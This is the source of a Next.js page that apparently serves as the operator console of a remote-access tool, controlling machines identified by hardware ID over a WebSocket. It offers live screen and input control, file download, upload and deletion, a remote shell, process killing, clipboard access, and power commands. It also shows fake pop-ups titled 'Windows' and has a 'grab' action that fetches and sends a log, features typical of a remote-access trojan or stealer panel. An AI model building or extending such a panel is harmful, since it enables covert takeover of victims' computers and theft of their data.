"use client";

import {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
  type PointerEvent as REPointerEvent,
  type KeyboardEvent as REKeyboardEvent,
  type WheelEvent as REWheelEvent,
} from "react";
import Link from "next/link";
import { useParams, useRouter } from "next/navigation";
import {
  ArrowLeft,
  Clipboard,
  Folder,
  Monitor,
  Power,
  Terminal,
  Info,
  List,
  MessageSquareWarning,
} from "lucide-react";
import { PageHead } from "@/components/shell/app-shell";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Surface } from "@/components/ui/surface";
import { CardBody, CardHeader, CardTitle } from "@/components/ui/card";
import { cn } from "@/lib/utils";
import { play } from "@/lib/sound";
import { PageSkeleton } from "@/components/ui/skeleton";
import { ConfirmDialog } from "@/components/ui/confirm-dialog";
import { ScreenView } from "@/components/control/screen-view";
import { FilePane } from "@/components/control/file-pane";
import { ShellPane } from "@/components/control/shell-pane";
import { SysPane } from "@/components/control/sys-pane";
import { ChatDock } from "@/components/control/chat-dock";
import { WarnDialog } from "@/components/control/warn-dialog";
import {
  joinPath,
  short,
  streamPayload,
  type AgentInfo,
  type FsEntry,
  type Quality,
  type Tab,
  type TalkLine,
} from "@/components/control/types";

const tabs: { id: Tab; label: string; icon: typeof Monitor }[] = [
  { id: "screen", label: "Screen", icon: Monitor },
  { id: "files", label: "Files", icon: Folder },
  { id: "sys", label: "System", icon: Power },
  { id: "proc", label: "Processes", icon: List },
  { id: "shell", label: "Shell", icon: Terminal },
  { id: "clip", label: "Clipboard", icon: Clipboard },
  { id: "info", label: "Info", icon: Info },
];

function vk(e: REKeyboardEvent) {
  if (e.key === "Enter") return 10;
  if (e.key === "Backspace") return 8;
  if (e.key === "Tab") return 9;
  if (e.key === "Escape") return 27;
  if (e.key === " ") return 32;
  if (e.key === "ArrowLeft") return 37;
  if (e.key === "ArrowUp") return 38;
  if (e.key === "ArrowRight") return 39;
  if (e.key === "ArrowDown") return 40;
  if (e.key === "Delete") return 127;
  if (e.key.length === 1) {
    const c = e.key.toUpperCase().charCodeAt(0);
    if (c >= 65 && c <= 90) return c;
    if (c >= 48 && c <= 57) return c;
  }
  return e.keyCode || 0;
}

export default function ControlPage() {
  const params = useParams();
  const hwid = decodeURIComponent(String(params.hwid || ""));
  const router = useRouter();
  const [tab, setTab] = useState<Tab>("screen");
  const [grabBusy, setGrabBusy] = useState(false);
  const [grabNote, setGrabNote] = useState<string | null>(null);
  const [agent, setAgent] = useState<AgentInfo | null>(null);
  const [wsUrl, setWsUrl] = useState<string | null>(null);
  const [live, setLive] = useState(false);
  const [online, setOnline] = useState(false);
  const [err, setErr] = useState<string | null>(null);
  const [streaming, setStreaming] = useState(false);
  const [quality, setQuality] = useState<Quality>("high");
  const [hasFrame, setHasFrame] = useState(false);
  const [fpsUi, setFpsUi] = useState(0);
  const [path, setPath] = useState("");
  const [entries, setEntries] = useState<FsEntry[]>([]);
  const [fsNote, setFsNote] = useState<string | null>(null);
  const [procs, setProcs] = useState<{ n: string; p: string }[]>([]);
  const [shellCmd, setShellCmd] = useState("");
  const [shellOut, setShellOut] = useState("");
  const [shellNote, setShellNote] = useState<string | null>(null);
  const [clipText, setClipText] = useState("");
  const [powNote, setPowNote] = useState<string | null>(null);
  const [powAsk, setPowAsk] = useState<{ kind: string; label: string } | null>(null);
  const [ready, setReady] = useState(false);
  const [warnOpen, setWarnOpen] = useState(false);
  const [warnTitle, setWarnTitle] = useState("Windows");
  const [warnText, setWarnText] = useState("");
  const [warnSticky, setWarnSticky] = useState(false);
  const [talkOpen, setTalkOpen] = useState(false);
  const [talkLive, setTalkLive] = useState(false);
  const [talkLines, setTalkLines] = useState<TalkLine[]>([]);
  const wsRef = useRef<WebSocket | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const imgBox = useRef<HTMLDivElement | null>(null);
  const capt = useRef(false);
  const wantStream = useRef(false);
  const streamingRef = useRef(false);
  const qualityRef = useRef<Quality>("high");
  const retryRef = useRef(0);
  const frameBusy = useRef(false);
  const fpsCount = useRef(0);
  const fpsTick = useRef(0);
  const lastFrameRef = useRef(0);
  const hasFrameRef = useRef(false);
  const liveRef = useRef(false);
  const onlineRef = useRef(false);
  const pathRef = useRef("");
  const talkWantRef = useRef(false);
  const rootsOnce = useRef(false);
  const pendingRef = useRef<Record<string, unknown>[]>([]);
  const onMsgRef = useRef<(raw: string) => void>(() => {});
  const paintFrameRef = useRef<(buf: ArrayBuffer) => void>(() => {});

  useEffect(() => {
    qualityRef.current = quality;
  }, [quality]);

  useEffect(() => {
    streamingRef.current = streaming;
  }, [streaming]);

  useEffect(() => {
    liveRef.current = live;
  }, [live]);

  useEffect(() => {
    onlineRef.current = online;
  }, [online]);

  useEffect(() => {
    pathRef.current = path;
  }, [path]);

  const flush = useCallback(() => {
    const ws = wsRef.current;
    if (!ws || ws.readyState !== 1) return;
    const q = pendingRef.current;
    pendingRef.current = [];
    for (const obj of q) {
      try {
        ws.send(JSON.stringify(obj));
      } catch {
      }
    }
  }, []);

  const send = useCallback((obj: Record<string, unknown>, wait = true) => {
    const ws = wsRef.current;
    if (ws && ws.readyState === 1) {
      ws.send(JSON.stringify(obj));
      return true;
    }
    if (!wait) return false;
    pendingRef.current.push(obj);
    if (pendingRef.current.length > 64) {
      pendingRef.current = pendingRef.current.slice(-64);
    }
    return false;
  }, []);

  const paintFrame = useCallback(async (buf: ArrayBuffer) => {
    if (frameBusy.current) return;
    frameBusy.current = true;
    try {
      const bmp = await createImageBitmap(new Blob([buf], { type: "image/jpeg" }));
      const c = canvasRef.current;
      if (!c) {
        bmp.close();
        return;
      }
      if (c.width !== bmp.width || c.height !== bmp.height) {
        c.width = bmp.width;
        c.height = bmp.height;
      }
      const ctx = c.getContext("2d", { alpha: false });
      if (ctx) {
        ctx.imageSmoothingEnabled = true;
        ctx.imageSmoothingQuality = "high";
        ctx.drawImage(bmp, 0, 0);
      }
      bmp.close();
      lastFrameRef.current = Date.now();
      if (!hasFrameRef.current) {
        hasFrameRef.current = true;
        setHasFrame(true);
      }
      if (!liveRef.current) {
        liveRef.current = true;
        setLive(true);
      }
      if (!onlineRef.current) {
        onlineRef.current = true;
        setOnline(true);
      }
      if (wantStream.current && !streamingRef.current) {
        streamingRef.current = true;
        setStreaming(true);
      }
      fpsCount.current += 1;
      const now = performance.now();
      if (now - fpsTick.current >= 1000) {
        setFpsUi(fpsCount.current);
        fpsCount.current = 0;
        fpsTick.current = now;
      }
    } catch {
    } finally {
      frameBusy.current = false;
    }
  }, []);

  const onMsg = useCallback((raw: string) => {
    try {
      const msg = JSON.parse(raw);
      const op = msg.op as string;
      const fresh = Date.now() - lastFrameRef.current < 3000;
      if (op === "hello") {
        if (msg.online || fresh) {
          onlineRef.current = true;
          setOnline(true);
        } else {
          onlineRef.current = false;
          setOnline(false);
        }
      }
      if (op === "agent.online") {
        onlineRef.current = true;
        setOnline(true);
      }
      if (op === "agent.offline") {
        if (!fresh && fpsCount.current === 0) {
          onlineRef.current = false;
          setOnline(false);
        }
      }
      if (op === "screen.ok") {
        streamingRef.current = true;
        setStreaming(true);
      }
      if (op === "screen.off") {
        streamingRef.current = false;
        setStreaming(false);
        setFpsUi(0);
      }
      if (op === "fs.roots" || op === "fs.list") {
        if (typeof msg.path === "string") setPath(msg.path);
        setEntries(Array.isArray(msg.entries) ? msg.entries : []);
        setFsNote(msg.err ? String(msg.err) : null);
      }
      if (op === "fs.get" && msg.err) setFsNote(String(msg.err));
      if (op === "fs.get" && msg.data && msg.name) {
        const bin = Uint8Array.from(atob(msg.data), (c) => c.charCodeAt(0));
        const blob = new Blob([bin]);
        const a = document.createElement("a");
        a.href = URL.createObjectURL(blob);
        a.download = msg.name;
        a.click();
        URL.revokeObjectURL(a.href);
      }
      if (op === "fs.put" || op === "fs.del" || op === "fs.mkdir") {
        if (msg.err) setFsNote(String(msg.err));
        else if (pathRef.current) send({ op: "fs.list", path: pathRef.current });
      }
      if (op === "proc.list" && Array.isArray(msg.rows)) setProcs(msg.rows);
      if (op === "shell.out") {
        const chunk = String(msg.text || msg.err || "");
        if (msg.err) setShellNote(String(msg.err));
        else setShellNote(null);
        setShellOut((prev) => {
          const next = (prev ? prev + "\n" : "") + chunk;
          return next.length > 80000 ? next.slice(-80000) : next;
        });
      }
      if (op === "clip.get") setClipText(msg.text || "");
      if (op === "pow") {
        if (msg.ok) setPowNote(null);
        else setPowNote(String(msg.err || "fail"));
      }
      if (op === "warn.ok" || op === "warn.off") setWarnOpen(false);
      if (op === "talk.open") setTalkLive(true);
      if (op === "talk.gone") {
        if (!talkWantRef.current) {
          setTalkLive(false);
          setTalkOpen(false);
        } else {
          setTalkLive(false);
        }
      }
      if (op === "talk.msg" && msg.text) {
        const from = msg.from === "pc" ? "pc" : "op";
        setTalkLines((p) => [...p, { from, text: String(msg.text), at: Date.now() }]);
        setTalkOpen(true);
        setTalkLive(true);
        talkWantRef.current = true;
      }
      if (op === "grab.start") {
        setGrabBusy(true);
        setGrabNote("fetching log…");
      }
      if (op === "grab.ok") {
        setGrabBusy(false);
        setGrabNote("log sent");
        play("ok");
      }
      if (op === "grab.busy") {
        setGrabBusy(false);
        setGrabNote("already running");
      }
      if (op === "err") setErr(String(msg.msg || "err"));
    } catch {
    }
  }, [send]);

  const connect = useCallback(async () => {
    setErr(null);
    const res = await fetch(`/api/agents/${encodeURIComponent(hwid)}`);
    if (res.status === 401) {
      router.push("/login");
      return;
    }
    const data = await res.json();
    if (!res.ok) {
      setErr(data.error || "fail");
      setReady(true);
      return;
    }
    setAgent(data.agent);
    setOnline(Boolean(data.agent?.online));
    setWsUrl(data.ws);
    setReady(true);
  }, [hwid, router]);

  useEffect(() => {
    void connect();
  }, [connect]);

  useEffect(() => {
    onMsgRef.current = onMsg;
  }, [onMsg]);

  useEffect(() => {
    paintFrameRef.current = paintFrame;
  }, [paintFrame]);

  useEffect(() => {
    if (!wsUrl) return;
    let cancelled = false;
    let timer: ReturnType<typeof setTimeout> | null = null;

    const open = () => {
      if (cancelled) return;
      const sock = new WebSocket(wsUrl);
      sock.binaryType = "arraybuffer";
      wsRef.current = sock;
      sock.onopen = () => {
        if (cancelled || wsRef.current !== sock) return;
        liveRef.current = true;
        setLive(true);
        setErr(null);
        retryRef.current = 0;
        flush();
        if (wantStream.current) {
          try {
            sock.send(JSON.stringify(streamPayload(qualityRef.current)));
          } catch {
          }
        }
        if (talkWantRef.current) {
          try {
            sock.send(JSON.stringify({ op: "talk.open" }));
          } catch {
          }
        }
      };
      sock.onclose = () => {
        if (wsRef.current !== sock) return;
        liveRef.current = false;
        setLive(false);
        if (!wantStream.current) {
          streamingRef.current = false;
          setStreaming(false);
          setFpsUi(0);
        }
        wsRef.current = null;
        if (cancelled) return;
        const wait = Math.min(15000, 1000 + retryRef.current * 1500);
        retryRef.current += 1;
        timer = setTimeout(open, wait);
      };
      sock.onerror = () => {
        if (wsRef.current !== sock) return;
        if (!hasFrameRef.current) setErr("ws error");
      };
      sock.onmessage = (ev) => {
        if (typeof ev.data === "string") {
          onMsgRef.current(ev.data);
          return;
        }
        void paintFrameRef.current(ev.data as ArrayBuffer);
      };
    };
    open();
    return () => {
      cancelled = true;
      if (timer) clearTimeout(timer);
      const s = wsRef.current;
      wsRef.current = null;
      try {
        s?.close();
      } catch {}
    };
  }, [wsUrl, flush]);

  useEffect(() => {
    if (!live) return;
    if (tab === "files" && !rootsOnce.current) {
      rootsOnce.current = true;
      send({ op: "fs.roots" });
    }
    if (tab === "proc") send({ op: "proc.list" });
  }, [tab, live, send]);

  const startStream = () => {
    wantStream.current = true;
    streamingRef.current = true;
    setStreaming(true);
    setErr(null);
    play("tap");
    send(streamPayload(quality));
  };

  const stopStream = () => {
    wantStream.current = false;
    streamingRef.current = false;
    setStreaming(false);
    setFpsUi(0);
    play("tap");
    send({ op: "screen.stop" });
  };

  const changeQuality = (next: Quality) => {
    setQuality(next);
    qualityRef.current = next;
    play("tap");
    if (wantStream.current) send(streamPayload(next));
  };

  const fresh = fpsUi > 0 || (hasFrame && streaming);
  const wsOk = live || fresh;
  const agentOk = online || fresh;

  const norm = useCallback((e: REPointerEvent) => {
    const el = imgBox.current;
    if (!el) return null;
    const r = el.getBoundingClientRect();
    const x = (e.clientX - r.left) / Math.max(1, r.width);
    const y = (e.clientY - r.top) / Math.max(1, r.height);
    return {
      x: Math.min(1, Math.max(0, x)),
      y: Math.min(1, Math.max(0, y)),
    };
  }, []);

  const onPtr = (e: REPointerEvent, kind: "move" | "down" | "up") => {
    if (!capt.current && kind === "move") return;
    const p = norm(e);
    if (!p) return;
    if (kind === "move") send({ op: "mouse.move", x: p.x, y: p.y }, false);
    if (kind === "down") {
      capt.current = true;
      (e.target as HTMLElement).setPointerCapture?.(e.pointerId);
      send({ op: "mouse.move", x: p.x, y: p.y }, false);
      send({ op: "mouse.down", b: e.button === 2 ? 3 : e.button === 1 ? 2 : 1 }, false);
    }
    if (kind === "up") {
      capt.current = false;
      send({ op: "mouse.up", b: e.button === 2 ? 3 : e.button === 1 ? 2 : 1 }, false);
    }
  };

  const onWheel = (e: REWheelEvent) => {
    e.preventDefault();
    send({ op: "mouse.wheel", d: e.deltaY > 0 ? 1 : -1 }, false);
  };

  const onKey = (e: REKeyboardEvent, down: boolean) => {
    e.preventDefault();
    const c = vk(e);
    if (!c) return;
    send({ op: down ? "key.down" : "key.up", c }, false);
  };

  const openEntry = (e: FsEntry) => {
    const next = joinPath(path, e.n);
    const ok = e.d ? send({ op: "fs.list", path: next }) : send({ op: "fs.get", path: next });
    if (!ok) setFsNote("queued — ws opening");
  };

  const title = useMemo(() => agent?.name || short(hwid), [agent, hwid]);

  if (!ready) return <PageSkeleton cards={2} className="max-w-[1600px]" />;

  return (
    <>
      <main className="mx-auto max-w-[1600px] px-5 py-8 md:px-8">
        <PageHead
          kicker="03 / control"
          title={title}
          desc={hwid}
          action={
            <div className="flex items-center gap-2">
              <Button asChild variant="ghost" size="sm">
                <Link href="/hwid">
                  <ArrowLeft className="h-4 w-4" />
                  list
                </Link>
              </Button>
              <Badge tone={wsOk ? "ok" : "muted"}>{wsOk ? "ws" : "ws off"}</Badge>
              <Badge tone={agentOk ? "ok" : "bad"}>{agentOk ? "agent" : "offline"}</Badge>
            </div>
          }
        />

        {err ? (
          <p className="mb-4 border border-destructive/30 bg-destructive/10 px-4 py-2 font-mono text-sm text-destructive">
            {err}
          </p>
        ) : null}

        <div className="mb-6 flex flex-wrap gap-1 rounded-2xl border border-white/10 bg-white/[0.02] p-1">
          {tabs.map((t) => (
            <button
              key={t.id}
              type="button"
              onClick={() => {
                play("tap");
                setTab(t.id);
              }}
              className={cn(
                "relative inline-flex items-center gap-2 rounded-xl px-4 py-2.5 font-mono text-xs uppercase tracking-[0.1em] transition",
                tab === t.id
                  ? "bg-white text-zinc-950"
                  : "text-muted-foreground hover:bg-white/[0.05] hover:text-foreground",
              )}
            >
              <t.icon className="h-3.5 w-3.5" />
              {t.label}
            </button>
          ))}
        </div>

        {tab === "screen" ? (
          <div className={cn("grid gap-4", talkOpen ? "xl:grid-cols-[minmax(0,1fr)_340px]" : "")}>
            <Surface className="p-0">
              <CardHeader className="flex flex-row flex-wrap items-center justify-between gap-3">
                <CardTitle>Screen</CardTitle>
                <div className="flex flex-wrap items-center gap-2">
                  <Button
                    size="sm"
                    variant="outline"
                    disabled={!wsOk || !agentOk}
                    onClick={() => setWarnOpen(true)}
                  >
                    <MessageSquareWarning className="size-3.5" />
                    warn
                  </Button>
                  {!talkOpen ? (
                    <ChatDock
                      open={false}
                      live={wsOk && agentOk}
                      lines={talkLines}
                      onOpen={() => {
                        talkWantRef.current = true;
                        setTalkOpen(true);
                        setTalkLive(true);
                        if (!send({ op: "talk.open" })) setErr("queued — ws opening");
                        play("tap");
                      }}
                      onClose={() => {}}
                      onSend={() => {}}
                    />
                  ) : null}
                </div>
              </CardHeader>
              <CardBody>
                <ScreenView
                  live={wsOk}
                  online={agentOk}
                  streaming={streaming}
                  fpsUi={fpsUi}
                  quality={quality}
                  hasFrame={hasFrame}
                  canvasRef={canvasRef}
                  imgBox={imgBox}
                  onStart={startStream}
                  onStop={stopStream}
                  onQuality={changeQuality}
                  onPtr={onPtr}
                  onWheel={onWheel}
                  onKey={onKey}
                />
              </CardBody>
            </Surface>
            {talkOpen ? (
              <ChatDock
                open
                live={wsOk && agentOk}
                lines={talkLines}
                onOpen={() => {}}
                onClose={() => {
                  talkWantRef.current = false;
                  send({ op: "talk.close" });
                  setTalkOpen(false);
                  setTalkLive(false);
                }}
                onSend={(text) => {
                  if (!send({ op: "talk.msg", from: "op", text })) {
                    setErr("queued — ws opening");
                  }
                  setTalkLines((p) => [...p, { from: "op", text, at: Date.now() }]);
                  if (!talkLive) {
                    talkWantRef.current = true;
                    send({ op: "talk.open" });
                  }
                }}
              />
            ) : null}
          </div>
        ) : null}

        {tab === "files" ? (
          <FilePane
            path={path}
            entries={entries}
            note={fsNote}
            live={wsOk}
            online={agentOk}
            onPath={setPath}
            onOpen={openEntry}
            onRoots={() => {
              if (!send({ op: "fs.roots" })) setFsNote("queued — ws opening");
            }}
            onList={(p) => {
              if (!send({ op: "fs.list", path: p })) setFsNote("queued — ws opening");
            }}
            onDel={() => {
              if (path && confirm("delete?")) {
                if (!send({ op: "fs.del", path })) setFsNote("queued — ws opening");
              }
            }}
            onPut={async (f) => {
              if (!path) {
                setFsNote("open a folder first");
                return;
              }
              if (f.size > 6 * 1024 * 1024) {
                setFsNote("max 6MB");
                return;
              }
              const buf = new Uint8Array(await f.arrayBuffer());
              let bin = "";
              for (let i = 0; i < buf.length; i++) bin += String.fromCharCode(buf[i]);
              const dest = joinPath(path, f.name);
              if (!send({ op: "fs.put", path: dest, data: btoa(bin) })) {
                setFsNote("queued — ws opening");
              }
            }}
          />
        ) : null}

        {tab === "sys" ? (
          <SysPane
            live={wsOk}
            online={agentOk}
            grabBusy={grabBusy}
            grabNote={grabNote}
            powNote={powNote}
            onGrab={() => {
              setGrabNote(null);
              setGrabBusy(true);
              if (!send({ op: "grab" })) {
                setGrabBusy(false);
                setGrabNote("queued — ws opening");
              } else setGrabNote("request sent…");
            }}
            onPow={(kind, label) => setPowAsk({ kind, label })}
          />
        ) : null}

        {tab === "proc" ? (
          <Surface>
            <CardHeader>
              <div className="flex items-center justify-between gap-3">
                <CardTitle>Processes</CardTitle>
                <Button size="sm" variant="outline" onClick={() => send({ op: "proc.list" })}>
                  refresh
                </Button>
              </div>
            </CardHeader>
            <CardBody>
              <div className="max-h-[560px] overflow-auto rounded-2xl border border-white/10">
                <table className="w-full text-left text-sm">
                  <thead>
                    <tr className="border-b border-white/10 font-mono text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
                      <th className="px-3 py-2">name</th>
                      <th className="px-3 py-2">pid</th>
                      <th className="px-3 py-2" />
                    </tr>
                  </thead>
                  <tbody>
                    {procs.map((r) => (
                      <tr key={r.p + r.n} className="border-b border-white/5">
                        <td className="px-3 py-1.5">{r.n}</td>
                        <td className="px-3 py-1.5 font-mono text-xs text-muted-foreground">
                          {r.p}
                        </td>
                        <td className="px-3 py-1.5 text-right">
                          <Button
                            size="sm"
                            variant="ghost"
                            onClick={() => send({ op: "proc.kill", pid: String(r.p) })}
                          >
                            kill
                          </Button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </CardBody>
          </Surface>
        ) : null}

        {tab === "shell" ? (
          <ShellPane
            cmd={shellCmd}
            out={shellOut}
            note={shellNote}
            live={wsOk}
            online={agentOk}
            onCmd={setShellCmd}
            onRun={() => {
              const c = shellCmd.trim();
              if (!c) return;
              setShellNote(null);
              setShellOut((p) => (p ? p + "\n" : "") + "> " + c);
              if (!send({ op: "shell", cmd: c })) setShellNote("queued — ws opening");
            }}
          />
        ) : null}

        {tab === "clip" ? (
          <Surface>
            <CardHeader>
              <CardTitle>Clipboard</CardTitle>
            </CardHeader>
            <CardBody className="space-y-3">
              <div className="flex gap-2">
                <Button size="sm" onClick={() => send({ op: "clip.get" })}>
                  get
                </Button>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => send({ op: "clip.set", text: clipText })}
                >
                  send
                </Button>
              </div>
              <textarea
                value={clipText}
                onChange={(e) => setClipText(e.target.value)}
                className="min-h-[240px] w-full rounded-2xl border border-white/10 bg-black/25 p-3 text-sm text-foreground outline-none focus:border-white/25"
              />
            </CardBody>
          </Surface>
        ) : null}

        {tab === "info" ? (
          <Surface>
            <CardHeader>
              <CardTitle>Info</CardTitle>
            </CardHeader>
            <CardBody className="space-y-0 text-sm">
              <Row k="HWID" v={hwid} />
              <Row k="Host" v={agent?.name || "—"} />
              <Row k="OS" v={agent?.os || "—"} />
              <Row k="IP" v={agent?.ip || "—"} />
              <Row
                k="Resolution"
                v={
                  agent?.meta && typeof agent.meta.w === "number"
                    ? `${agent.meta.w}×${agent.meta.h}`
                    : "—"
                }
              />
              <Row
                k="Last seen"
                v={agent?.lastSeen ? new Date(agent.lastSeen * 1000).toLocaleString() : "—"}
              />
            </CardBody>
          </Surface>
        ) : null}
      </main>

      <WarnDialog
        open={warnOpen}
        title={warnTitle}
        text={warnText}
        sticky={warnSticky}
        onTitle={setWarnTitle}
        onText={setWarnText}
        onSticky={setWarnSticky}
        onClose={() => setWarnOpen(false)}
        onStop={() => {
          send({ op: "warn.hide" });
          setWarnOpen(false);
        }}
        onSend={() => {
          if (!send({
            op: "warn.show",
            title: warnTitle.trim() || "Windows",
            text: warnText.trim(),
            sticky: warnSticky,
          })) {
            setErr("queued — ws opening");
          }
          play("ok");
        }}
      />

      <ConfirmDialog
        open={Boolean(powAsk)}
        title={powAsk ? powAsk.label : ""}
        desc="This runs on the remote host immediately."
        confirmLabel="run"
        onCancel={() => setPowAsk(null)}
        onConfirm={() => {
          if (!powAsk) return;
          play("ok");
          setPowNote(null);
          send({ op: "pow", kind: powAsk.kind });
          setPowAsk(null);
        }}
      />
    </>
  );
}

function Row({ k, v }: { k: string; v: string }) {
  return (
    <div className="flex gap-3 border-b border-white/5 py-2 last:border-0">
      <span className="w-28 shrink-0 font-mono text-[10px] uppercase tracking-[0.14em] text-muted-foreground">
        {k}
      </span>
      <span className="break-all font-mono text-xs">{v}</span>
    </div>
  );
}
